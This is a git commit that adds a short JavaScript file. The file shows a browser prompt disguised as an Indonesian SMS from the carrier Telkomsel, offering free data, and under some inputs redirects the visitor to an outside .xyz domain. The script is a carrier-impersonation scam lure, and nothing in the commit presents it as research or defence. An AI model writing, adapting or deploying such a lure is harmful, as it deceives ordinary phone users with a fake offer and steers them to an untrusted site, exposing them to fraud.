dd7974eed41fde1fb9b66c956fd81fcda2dfae26
newetijazz8 <newetijazz8@gmail.com>
2025-12-16 11:59:58 +0100

    Create telkomsel.js

---
+++ telkomsel.js
@@ -0,0 +1,5 @@
+var password = 'MENGAKTIFKAN'
+password=prompt('SMS: Selamat, nomor Telkomsel Anda memenuhi syarat untuk menerima data gratis, klik OK untuk mengaktifkannya sekarang.','MENGAKTIFKAN');
+if (password != 'MENGAKTIFKAN') {
+location.href='https://www.itinpty.xyz/telkomsel';
+}
